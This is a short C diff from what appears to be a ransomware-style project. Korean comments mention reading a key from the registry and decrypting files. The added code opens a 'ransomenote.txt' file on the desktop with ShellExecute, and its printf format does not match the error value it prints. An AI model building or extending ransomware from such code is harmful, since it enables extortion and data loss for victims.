@@ -379,6 +379,15 @@ int main()
 
     // key을 레지스트리에서 읽어오고
     // decrypt 실행해서 원본파일 복원하기
+
+   LPCWSTR filePath = L"C:\\Users\\82107\\바탕 화면\\ransomenote.txt";
+
+    HINSTANCE result = ShellExecute(NULL, L"open", filePath, NULL, NULL, SW_SHOWNORMAL);
+    if ((int)result <= 32) {
+        printf("Error opening file: %s",GetLastError() );
+        return 1;
+    }
+
     return 0;
 
 }
